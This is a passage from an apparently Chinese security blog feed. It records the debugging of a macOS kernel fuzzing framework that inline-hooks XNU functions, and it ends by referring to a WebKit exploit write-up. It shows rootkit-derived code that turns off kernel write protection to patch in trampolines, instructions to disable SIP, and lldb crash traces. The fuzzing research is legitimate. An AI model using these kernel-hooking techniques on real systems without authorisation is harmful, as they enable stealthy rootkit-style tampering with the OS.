<p>理解了本文的内容，读者自行调试后面的利用技巧并不困难。这里就详细记录了。</p>
<h1 id="引用">引用</h1><p>[1] <a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">http://phrack.org/papers/attacking_javascript_engines.html</a></p>
<p>[2] <a href="https://webkit.org/building-webkit/" target="_blank" rel="external">https://webkit.org/building-webkit/</a></p>
<p>[3] <a href="https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/" target="_blank" rel="external">https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/</a></p>
<h1 id="PS">PS</h1><p>Thanks to <a href="phrack@saelo.net">saelo</a> for answering my doubts ：）</p>
<p><a href="https://twitter.com/5aelo" target="_blank" rel="external">https://twitter.com/5aelo</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> 本文基于<a href="phrack@saelo.net">saelo</a>在 <a href="http://phrack.org">phrack</a>上发表的<a href="http://phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines</a>一文，记录了调试的过程。</p>
<p><a href="https://github.com/saelo/jscpwn">POC</a></p>]]>
    
    </summary>
    
      <category term="javascrip" scheme="http://turingh.github.io/tags/javascrip/"/>
    
      <category term="safari" scheme="http://turingh.github.io/tags/safari/"/>
    
      <category term="webkit" scheme="http://turingh.github.io/tags/webkit/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PassiveFuzz框架试用与调试小记]]></title>
    <link href="http://turingh.github.io/2016/11/21/try-out-PassiveFuzzFrameworkOSX/"/>
    <id>http://turingh.github.io/2016/11/21/try-out-PassiveFuzzFrameworkOSX/</id>
    <published>2016-11-22T03:22:12.000Z</published>
    <updated>2016-11-22T05:17:02.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    前段时间<code>TREND</code>的研究员在<code>POC</code>安全大会上介绍了一款<code>OS X</code>系统上面的<code>Fuzz</code>框架，并且开源了。<code>github</code>点<a href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX" target="_blank" rel="external">这里</a>。我记得看雪好像已经有翻译成中文版的PPT，找了一下没找到:-(。网上能找到的信息，这里就不复述了，有兴趣的读者可以自行阅读。</p>
<p>​    简单来说就是通过内核扩展，对一系列内核函数进行<code>inline hook</code>，在这些被<code>hook</code>的函数被调用的时候，对参数进行一些随机的修改。所以叫做被动式Fuzz，而不是传统的主动调用内核函数传入不同的参数。</p>
<a id="more"></a>
<h1 id="0x01_XNU内核函数符号">0x01 XNU内核函数符号</h1><p>​    因为是通过编写<code>XNU</code>内核扩展的实现的<code>inline hook</code>构建的整套<code>Fuzz</code>的框架，内核的符号表是一个非常重要的事情，同时在编写一些内核漏洞的利用时，内核的符号表同样的重要。这里简单的介绍一下思路和流程，具体的思路网上已经有很详细的叙述，有兴趣的读者可以自行阅读相关的技术细节[<a href="http://phrack.org/issues/69/7.html#article" target="_blank" rel="external">1</a>] [<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">2</a>] 。</p>
<ul>
<li>读取内核文件的Mach-O头部</li>
<li>从<code>__TEXT</code>、<code>__LINKEDIT</code>的<code>segment</code>中获取相关信息</li>
<li>从<code>LC_SYMTAB</code>获取<code>nlist</code>数据结构</li>
<li>结合获取到的信息，就可以计算出需要的内核函数在运行时的地址了。</li>
</ul>
<p>相关的源码也可以看到，不过和我们fuzz的核心逻辑关系不大，可以看到源码的<code>main.c</code>文件。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">the_flying_circus_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr= KERN_SUCCESS;</span><br><span class="line">    </span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    <span class="comment">//moony_modify//printf("[DEBUG] Starting the circus  the_flying_circus_start...\n");</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// read kernel from filesystem and initialize a kernel_info structure</span></span><br><span class="line">    <span class="keyword">if</span>(init_kernel_info(&amp;g_kernel_info)) <span class="keyword">return</span> KERN_FAILURE; &lt;--这里做的事情就是解决内核符号</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if zombie mode is activated, all the rootkit features will be activated</span></span><br><span class="line">    <span class="comment">// inside the zombie thread and we just return failure here</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> ZOMBIE_MODE &gt; <span class="number">0</span></span></span><br><span class="line">    <span class="comment">// disable logging features to avoid error messages from kext failure to load</span></span><br><span class="line">    <span class="comment">//disable_oskextlog();</span></span><br><span class="line">    <span class="comment">//disable_kextd_syslog();</span></span><br><span class="line">    <span class="comment">// activate the zombie</span></span><br><span class="line">    <span class="comment">//unleash_the_zombie();</span></span><br><span class="line">    <span class="comment">//return KERN_FAILURE;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*...*/</span> <span class="comment">//rootkit相关的功能，与我们的fuzz逻辑无关，不需要关注</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">//@flyic moony_li@trendmicro.com 2015-06-17</span></span><br><span class="line">    kr |= init_inline_hook();				&lt;-- 初始化<span class="keyword">inline</span> hook的信息	</span><br><span class="line">    kr |= install_inline_hook();			 &lt;-- <span class="keyword">inline</span> hook 具体实施</span><br><span class="line">    <span class="comment">//set_kernel_panic_hook();//This way for monior panic dump does not work!</span></span><br><span class="line">    <span class="comment">//moony_modify//printf("[DEBUG] the_flying_circus_start done...\n");</span></span><br><span class="line">    <span class="comment">//init_collect_log();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02_inline_hook的实现">0x02 inline hook的实现</h1><p>这里简单的阅读一下源码，看看<code>inline hook</code>的具体实现。最核心的函数如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">install_trampoline_any(<span class="keyword">mach_vm_address_t</span> patch_addr, <span class="keyword">mach_vm_address_t</span> dest_address, <span class="keyword">void</span> *orig_bytes)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> trampoline[<span class="number">12</span>] = <span class="string">"\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"</span> <span class="comment">// mov rax, address</span></span><br><span class="line">    <span class="string">"\xFF\xE0"</span>; <span class="comment">// jmp rax</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//mach_vm_address_t patch_addr = solve_kernel_symbol(&amp;g_kernel_info, symbol);</span></span><br><span class="line">    <span class="keyword">if</span> (patch_addr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">        <span class="comment">//moony_modify//printf("[ERROR] patch_addr[0x%x] is not valid [%s]\n", patch_addr, __FUNCTION__);</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// store the original bytes in user provided buffer</span></span><br><span class="line">    <span class="built_in">memcpy</span>(orig_bytes, (<span class="keyword">void</span>*)patch_addr, <span class="keyword">sizeof</span>(trampoline));</span><br><span class="line">    <span class="comment">// XOR the original bytes</span></span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; TRAMPOLINE_SIZE; i++)</span></span><br><span class="line">    <span class="comment">//    ((char*)orig_bytes)[i] ^= XOR_KEY;</span></span><br><span class="line">    <span class="comment">// set the target address</span></span><br><span class="line">    <span class="built_in">memcpy</span>(trampoline+<span class="number">2</span>, &amp;dest_address, <span class="keyword">sizeof</span>(<span class="keyword">mach_vm_address_t</span>));</span><br><span class="line">    <span class="comment">// patch the target address with the trampoline</span></span><br><span class="line">    disable_interrupts();</span><br><span class="line">    disable_wp();</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)patch_addr, trampoline, <span class="keyword">sizeof</span>(trampoline));</span><br><span class="line">    enable_wp();</span><br><span class="line">    enable_interrupts();</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现逻辑十分简单：</p>
<ul>
<li>解决函数符号之后，获取目标函数的地址</li>
<li>将目标地址处的代码替换成跳转的到我们自己实现的函数的代码</li>
</ul>
<p>在<code>install_trampoline_any</code>处下断点。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x0001, 0xffffff7f8ba5ff02 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 34 at hijacking_utils.c:271, stop reason = breakpoint 1.1&#10;    frame #0: 0xffffff7f8ba5ff02 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 34 at hijacking_utils.c:271&#10;   268 &#9;kern_return_t&#10;   269 &#9;install_trampoline_any(mach_vm_address_t patch_addr, mach_vm_address_t dest_address, void *orig_bytes)&#10;   270 &#9;&#123;&#10;-&#62; 271 &#9;    char trampoline[12] = &#34;\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00&#34; // mov rax, address&#10;   272 &#9;    &#34;\xFF\xE0&#34;; // jmp rax&#10;   273&#10;   274 &#9;    //mach_vm_address_t patch_addr = solve_kernel_symbol(&#38;g_kernel_info, symbol);</span><br></pre></td></tr></table></figure>
<p>查看<code>patch_addr</code>和<code>dest_address</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.development`ipc_kmsg_get:&#10;    0xffffff8009c5ea50 &#60;+0&#62;:  pushq  %rbp&#10;    0xffffff8009c5ea51 &#60;+1&#62;:  movq   %rsp, %rbp&#10;    0xffffff8009c5ea54 &#60;+4&#62;:  pushq  %r15&#10;    0xffffff8009c5ea56 &#60;+6&#62;:  pushq  %r14&#10;    0xffffff8009c5ea58 &#60;+8&#62;:  pushq  %r13&#10;    0xffffff8009c5ea5a &#60;+10&#62;: pushq  %r12&#10;    0xffffff8009c5ea5c &#60;+12&#62;: pushq  %rbx&#10;    0xffffff8009c5ea5d &#60;+13&#62;: subq   $0x28, %rsp&#10;    0xffffff8009c5ea61 &#60;+17&#62;: movq   %rdx, %r14&#10;    0xffffff8009c5ea64 &#60;+20&#62;: movl   %esi, %r13d&#10;    0xffffff8009c5ea67 &#60;+23&#62;: movq   %rdi, %r15&#10;(lldb) dis -s dest_address&#10;pasive_kernel_fuzz`trampline_ipc_kmsg_get:&#10;    0xffffff7f8ba61890 &#60;+0&#62;:  pushq  %rbp&#10;    0xffffff7f8ba61891 &#60;+1&#62;:  movq   %rsp, %rbp&#10;    0xffffff7f8ba61894 &#60;+4&#62;:  subq   $0x80, %rsp&#10;    0xffffff7f8ba6189b &#60;+11&#62;: movq   %rdi, -0x8(%rbp)&#10;    0xffffff7f8ba6189f &#60;+15&#62;: movl   %esi, -0xc(%rbp)&#10;    0xffffff7f8ba618a2 &#60;+18&#62;: movq   %rdx, -0x18(%rbp)&#10;    0xffffff7f8ba618a6 &#60;+22&#62;: nop&#10;    0xffffff7f8ba618a7 &#60;+23&#62;: nop&#10;    0xffffff7f8ba618a8 &#60;+24&#62;: nop&#10;    0xffffff7f8ba618a9 &#60;+25&#62;: nop</span><br></pre></td></tr></table></figure>
<p>分别是我们的目标函数和<code>hook</code>函数。</p>
<p>执行到函数执行完之后。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x0001, 0xffffff7f8ba5ff88 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 168 at hijacking_utils.c:295, stop reason = step over&#10;    frame #0: 0xffffff7f8ba5ff88 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 168 at hijacking_utils.c:295&#10;   292 &#9;    memcpy((void*)patch_addr, trampoline, sizeof(trampoline));&#10;   293 &#9;    enable_wp();&#10;   294 &#9;    enable_interrupts();&#10;-&#62; 295 &#9;    return KERN_SUCCESS;&#10;   296 &#9;&#125;&#10;   297&#10;   298</span><br></pre></td></tr></table></figure>
<p>我们再次观察<code>patch_addr</code>和<code>dest_address</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.development`ipc_kmsg_get:&#10;    0xffffff8009c5ea50 &#60;+0&#62;:  movabsq $-0x807459e770, %rax      ; imm = 0xFFFFFF7F8BA61890&#10;    0xffffff8009c5ea5a &#60;+10&#62;: jmpq   *%rax&#10;    0xffffff8009c5ea5c &#60;+12&#62;: pushq  %rbx&#10;    0xffffff8009c5ea5d &#60;+13&#62;: subq   $0x28, %rsp&#10;    0xffffff8009c5ea61 &#60;+17&#62;: movq   %rdx, %r14&#10;    0xffffff8009c5ea64 &#60;+20&#62;: movl   %esi, %r13d&#10;    0xffffff8009c5ea67 &#60;+23&#62;: movq   %rdi, %r15&#10;(lldb) dis -s dest_address&#10;pasive_kernel_fuzz`trampline_ipc_kmsg_get:&#10;    0xffffff7f8ba61890 &#60;+0&#62;:  pushq  %rbp&#10;    0xffffff7f8ba61891 &#60;+1&#62;:  movq   %rsp, %rbp&#10;    0xffffff7f8ba61894 &#60;+4&#62;:  subq   $0x80, %rsp&#10;    0xffffff7f8ba6189b &#60;+11&#62;: movq   %rdi, -0x8(%rbp)&#10;    0xffffff7f8ba6189f &#60;+15&#62;: movl   %esi, -0xc(%rbp)&#10;    0xffffff7f8ba618a2 &#60;+18&#62;: movq   %rdx, -0x18(%rbp)&#10;    0xffffff7f8ba618a6 &#60;+22&#62;: nop&#10;    0xffffff7f8ba618a7 &#60;+23&#62;: nop&#10;    0xffffff7f8ba618a8 &#60;+24&#62;: nop&#10;    0xffffff7f8ba618a9 &#60;+25&#62;: nop</span><br></pre></td></tr></table></figure>
<p>可以看到目标函数已经成功的被<code>inline hook</code>了。</p>
<h1 id="0x03_执行pasive_kel_fuzz-kext">0x03 执行pasive_kel_fuzz.kext</h1><p>​    <code>github</code>中的源码克隆下来之后会有提前编译好的二进制文件，用了之后没啥反应也不知道为什么，我直接用了自己编译的内核扩展。</p>
<h2 id="3-1_启动参数">3.1 启动参数</h2><p>​    因为我没有两台机器用的是虚拟机，所以不能使用文档中推荐的系统启动参数，我使用的启动参数是这样的</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140;  Desktop sudo nvram boot-args&#10;Password:&#10;boot-args&#9;debug=0x141 kext-dev-mode=1 kcsuffix=development pmuflags=1 -v</span><br></pre></td></tr></table></figure>
<p>本来我使用的启动参数是</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot-args&#9;debug=0xd66 _panicd_ip=xx.xx.xx.xx kext-dev-mode=1 kcsuffix=development pmuflags=1 -v</span><br></pre></td></tr></table></figure>
<p>但是崩溃的<code>core</code>文件看不到调用栈，只能看到崩溃的一层栈，也不知道是为什么。所以使用在系统启动时使用<code>lldb</code>attach 上去，可以看到崩溃时的完整栈。</p>
<h1 id="3-2_加载内核">3.2 加载内核</h1><p>没有签名是加载内核需要把<code>rootless</code>关掉，也就是<code>SIP</code>要关掉。</p>
<p>关闭之后就正常的按照文档中的介绍加载内核就可以了。</p>
<h1 id="3-3_执行崩溃">3.3 执行崩溃</h1><p>加载内核之后，系统立刻就崩溃了。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/pasive_fuzz/dump.png" alt="崩溃"></p>
<p>调用栈如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 1 stopped&#10;* thread #1: tid = 0x0001, 0xffffff800d90e05b kernel.development`memcpy + 11, stop reason = EXC_BAD_ACCESS (code=1, address=0x163de000)&#10;    frame #0: 0xffffff800d90e05b kernel.development`memcpy + 11&#10;kernel.development`memcpy:&#10;-&#62;  0xffffff800d90e05b &#60;+11&#62;: rep&#10;    0xffffff800d90e05c &#60;+12&#62;: movsq  (%rsi), %es:(%rdi)&#10;    0xffffff800d90e05e &#60;+14&#62;: movq   %rdx, %rcx&#10;    0xffffff800d90e061 &#60;+17&#62;: andq   $0x7, %rcx&#10;(lldb) bt&#10;* thread #1: tid = 0x0001, 0xffffff800d90e05b kernel.development`memcpy + 11, stop reason = EXC_BAD_ACCESS (code=1, address=0x163de000)&#10;  * frame #0: 0xffffff800d90e05b kernel.development`memcpy + 11&#10;    frame #1: 0xffffff7f8e7485e8&#10;    frame #2: 0xffffff7f8e746630&#10;    frame #3: 0xffffff800e0b8507 kernel.development`::shim_io_connect_method_scalarI_scalarO(method=&#60;unavailable&#62;, object=&#60;unavailable&#62;, input=&#60;unavailable&#62;, inputCount=&#60;unavailable&#62;, output=&#60;unavailable&#62;, outputCount=&#60;unavailable&#62;) + 647 at IOUserClient.cpp:4086 [opt]&#10;    frame #4: 0xffffff800e0bacd8 kernel.development`IOUserClient::externalMethod(this=&#60;unavailable&#62;, selector=&#60;unavailable&#62;, args=&#60;unavailable&#62;, dispatch=&#60;unavailable&#62;, target=&#60;unavailable&#62;, reference=&#60;unavailable&#62;) + 632 at IOUserClient.cpp:5295 [opt]&#10;    frame #5: 0xffffff800e0b7e17 kernel.development`::is_io_connect_method(connection=0xffffff886e39ba50, selector=10, scalar_input=&#60;unavailable&#62;, scalar_inputCnt=&#60;unavailable&#62;, inband_input=&#60;unavailable&#62;, inband_inputCnt=0, ool_input=&#60;unavailable&#62;, ool_input_size=&#60;unavailable&#62;, inband_output=&#60;unavailable&#62;, inband_outputCnt=&#60;unavailable&#62;, scalar_output=&#60;unavailable&#62;, scalar_outputCnt=&#60;unavailable&#62;, ool_output=&#60;unavailable&#62;, ool_output_size=&#60;unavailable&#62;) + 487 at IOUserClient.cpp:3900 [opt]&#10;    frame #6: 0xffffff7f8f84dd03 pasive_kernel_fuzz`trampline_is_io_connect_method(connection=0xffffff8016acc200, selector=10, scalar_input=0xffffff8016659330, scalar_inputCnt=2, inband_input=&#34;&#34;, inband_inputCnt=0, ool_input=0, ool_input_size=0, inband_output=&#34;&#34;, inband_outputCnt=0xffffff8018e155fc, scalar_output=0xffffff886e39bd30, scalar_outputCnt=0xffffff886e39bd2c, ool_output=0, ool_output_size=0xffffff8016659364) + 1587 at is_io_connect_method_trampline.c:663&#10;    frame #7: 0xffffff800db58750 kernel.development`_Xio_connect_method(InHeadP=&#60;unavailable&#62;, OutHeadP=0xffffff8018e155d0) + 384 at device_server.c:8255 [opt]&#10;    frame #8: 0xffffff800da83443 kernel.development`ipc_kobject_server(request=0xffffff80166592a0) + 259 at ipc_kobject.c:340 [opt]&#10;    frame #9: 0xffffff800da5ef03 kernel.development`ipc_kmsg_send(kmsg=&#60;unavailable&#62;, option=&#60;unavailable&#62;, send_timeout=0) + 211 at ipc_kmsg.c:1443 [opt]&#10;    frame #10: 0xffffff800da75985 kernel.development`mach_msg_overwrite_trap(args=&#60;unavailable&#62;) + 197 at mach_msg.c:474 [opt]&#10;    frame #11: 0xffffff7f8f85df47 pasive_kernel_fuzz`trampline_mach_msg_overwrite_trap(args=0xffffff886e39bf28) + 311 at mach_msg_overwrite_trap_trampline.c:131&#10;    frame #12: 0xffffff800db7f000 kernel.development`mach_call_munger64(state=0xffffff8015920720) + 480 at bsd_i386.c:560 [opt]&#10;    frame #13: 0xffffff800dbb4de6 kernel.development`hndl_mach_scall64 + 22</span><br></pre></td></tr></table></figure>
<p>可以看到frame #1 #2 #3的调用栈没有具体的函数符号，跳转到frame #6 通过变量获取一些信息。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) f 6&#10;frame #6: 0xffffff7f8f84dd03 pasive_kernel_fuzz`trampline_is_io_connect_method(connection=0xffffff8016acc200, selector=10, scalar_input=0xffffff8016659330, scalar_inputCnt=2, inband_input=&#34;&#34;, inband_inputCnt=0, ool_input=0, ool_input_size=0, inband_output=&#34;&#34;, inband_outputCnt=0xffffff8018e155fc, scalar_output=0xffffff886e39bd30, scalar_outputCnt=0xffffff886e39bd2c, ool_output=0, ool_output_size=0xffffff8016659364) + 1587 at is_io_connect_method_trampline.c:663&#10;   660 &#9;        g_fuzz_sample_info_index--;&#10;   661 &#9;    &#125;&#10;   662 &#9;    lck_mtx_unlock(g_fuzz_sample_info_mutext);&#10;-&#62; 663 &#9;    kr = ((fn_is_io_connect_method_t )inlined_part_is_io_connect_method)(&#10;   664 &#9;                                               //io_connect_t&#10;   665 &#9;                                               connection,&#10;   666 &#9;                                          //uint32_t&#10;   &#10;(lldb) p (char*)g_fuzz_sample_info[g_fuzz_sample_info_index].env.szClassName&#10;(char *) $3 = 0xffffff7f8faa9038 &#34;prl_video_ac_surface&#34;&#10;(lldb) p (char*)g_fuzz_sample_info[g_fuzz_sample_info_index].env.szProcName&#10;(char *) $4 = 0xffffff7f8faa9849 &#34;WindowServer&#34;&#10;(lldb) p (char*)g_fuzz_sample_info[g_fuzz_sample_info_index].env.szServiceClassName&#10;(char *) $5 = 0xffffff7f8faa9448 &#60;no value available&#62;</span><br></pre></td></tr></table></figure>
<p>但是看不到<code>ServiceClassName</code>，调用内核调试的脚本showallkmods。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) showallkmods&#10;UUID                                 kmod_info            address              size                  id  refs              version name&#10;B247A93A-1FEF-3A25-AECB-93F84593FDF6 0xffffff7f8f8fc660   0xffffff7f8f849000   0xfc1000             110     0                    1 put.as.pasive-kernel-fuzz&#10;5208EAB1-6B60-317E-83AF-FCE74FDD9B7F 0xffffff7f8e6a7a68   0xffffff7f8e64d000   0x5e000              109     0                3.0.1 com.apple.filesystems.smbfs&#10;2461725B-E5F1-3947-8AD8-8781308FA614 0xffffff7f8f20e508   0xffffff7f8f206000   0x9000               108     0                  3.0 com.apple.filesystems.autofs&#10;5A796890-4ED5-3BA9-8638-84EBBBDD2D53 0xffffff7f8e64b020   0xffffff7f8e648000   0x5000               107     2                  1.0 com.apple.kext.triggers&#10;47657EC5-2536-3174-97A7-6C19BA1067A4 0xffffff7f8f3854cc   0xffffff7f8f37e000   0x9000               106     0              1.0.2d2 com.apple.driver.AppleTyMCEDriver&#10;D9EF7435-0F3C-37BD-AA34-F1B7353C8D4F 0xffffff7f8f2ca528   0xffffff7f8f2c6000   0x5000               105     0                 1.70 com.apple.driver.AudioAUUC&#10;1AF6EE80-2420-C5D8-7F83-9E2446C1320C 0xffffff7f8f6db900   0xffffff7f8f6d7000   0x5000               104     0                1.1.0 com.parallels.driver.AppleIntelAC97Audio&#10;D0B2999C-6EB8-3E88-8CA5-60E05B6AD462 0xffffff7f8f5964a0   0xffffff7f8f593000   0x4000               103     0                    1 com.apple.driver.AppleOSXWatchdog&#10;B418B8D4-27F9-373C-8BEC-802554F3F794 0xffffff7f8e776d10   0xffffff7f8e76c000   0xb000               102     0                    1 com.apple.driver.pmtelemetry&#10;B2989894-92E1-3A9F-8F9A-924960162ABB 0xffffff7f8e8a1e20   0xffffff7f8e89c000   0x6000               101     0                1.0.1 com.apple.iokit.IOUserEthernet&#10;354FC780-7EA4-3C3F-A9E1-2658F63663A9 0xffffff7f8ed75b80   0xffffff7f8ed69000   0x13000              100     0              108.2.3 com.apple.iokit.IOSurface&#10;57A03351-E0D2-348B-A442-C4F5B6C4310E 0xffffff7f8ef41978   0xffffff7f8ef38000   0xa000                99     0              4.4.6f1 com.apple.iokit.IOBluetoothSerialManager&#10;854221E2-E1EB-361A-98C6-DC6B7E1EB0F4 0xffffff7f8ed964e0   0xffffff7f8ed8d000   0xe000                98     1                   11 com.apple.iokit.IOSerialFamily&#10;9B3C8089-B7BD-32F6-AC84-18501E3A5B1C 0xffffff7f8efdacb0   0xffffff7f8ef4c000   0xc3000               97     0              4.4.6f1 com.apple.iokit.IOBluetoothFamily&#10;3164D09B-101E-38E5-9399-BDE428C1E877 0xffffff7f8f0cb9a0   0xffffff7f8f0c8000   0x5000                96     0                7.0.0 com.apple.Dont_Steal_Mac_OS_X&#10;D04FEA18-A347-31F1-A04A-ED762DB9F0DE 0xffffff7f8f1f6668   0xffffff7f8f1f3000   0x7000                95     0                    1 com.apple.driver.CoreCaptureResponder&#10;0B572B9E-F1D5-31B0-AB6B-E19630F5126C 0xffffff7f8f1e1c68   0xffffff7f8f1c9000   0x22000               94     1                1.0.4 com.apple.driver.corecapture&#10;D8BF62A5-B66D-3495-9FBF-0B6D89CB2455 0xffffff7f8f6ef040   0xffffff7f8f6e6000   0xa000                93     0                    1 com.apple.driver.AppleHV&#10;A5A73220-5E26-3283-B29B-FEA298629620 0xffffff7f8f63f9d0   0xffffff7f8f63e000   0x2000                92     0                4.0.0 com.apple.driver.AppleIntelSlowAdaptiveClocking&#10;514292C4-55BD-3550-9DEB-1431BC04A629 0xffffff7f8ed84c78   0xffffff7f8ed82000   0x5000                91     1                1.0.0 com.apple.iokit.IOSlowAdaptiveClockingFamily&#10;864DACA4-8F2F-3442-B389-A42434D0F878 0xffffff7f8f77c9d8   0xffffff7f8f77a000   0x3000                90     0                4.1.0 com.apple.driver.AppleFIVRDriver&#10;EB8B7A35-4C31-A25F-87FC-AB5AAE190585 0xffffff7f8e7664c0   0xffffff7f8e762000   0x5000                89     0         12.1.0 41489 com.parallels.kext.tg&#10;6E57BC33-C4AF-3611-97B7-31CA2A2C88DD 0xffffff7f8f379520   0xffffff7f8f375000   0x5000                88     0                3.6.1 com.apple.driver.AppleUpstreamUserClient&#10;FE49EB19-A41C-3E7B-89CE-5411C85593D4 0xffffff7f8f5be6f8   0xffffff7f8f5b1000   0xe000                87     0               1.2.13 com.apple.driver.AppleMCCSControl&#10;546B348A-B5A7-3C41-9DDE-02A0A7B640B5 0xffffff7f8f5a96f0   0xffffff7f8f5a0000   0xe000                86     1             1.0.14d1 com.apple.driver.AppleSMBusController&#10;4EB2843C-C821-3AD0-B333-575FD6ED6FB1 0xffffff7f8eea1c58   0xffffff7f8ee98000   0x10000               85     0                2.4.1 com.apple.iokit.IONDRVSupport&#10;5820F1CC-8084-3447-AA45-ABB32D56EF25 0xffffff7f8ee42550   0xffffff7f8ee32000   0x11000               84     0                1.0.0 com.apple.driver.ACPI_SMC_PlatformPlugin&#10;7444F81D-08A8-36CE-A017-247C66701E4D 0xffffff7f8ee0e2c0   0xffffff7f8ee03000   0x12000               83     1                1.0.0 com.apple.driver.IOPlatformPluginLegacy&#10;4BEF649C-7CFD-31CA-8D84-1F0DB25BF60B 0xffffff7f8edfedf8   0xffffff7f8edf9000   0xa000                82     3              6.0.0d7 com.apple.driver.IOPlatformPluginFamily&#10;0C1376F2-15F7-30AD-BEEB-4CFC4AC4240A 0xffffff7f8f50b9a0   0xffffff7f8f50a000   0x3000                81     0             1.0.14d1 com.apple.driver.AppleSMBusPCI&#10;5F94D8E3-B1E5-35D7-AB7A-6419C3AAC3B5 0xffffff7f8f764f40   0xffffff7f8f750000   0x1e000               80     0               274.12 com.apple.driver.AppleHDAController&#10;C6423C28-4CFB-32A8-BDD1-2D149DE52F74 0xffffff7f8f748608   0xffffff7f8f741000   0xc000                79     1               274.12 com.apple.iokit.IOHDAFamily&#10;16D694E8-A341-3DAC-A710-57BC95EF7758 0xffffff7f8f2ab810   0xffffff7f8f28d000   0x31000               78     3                204.4 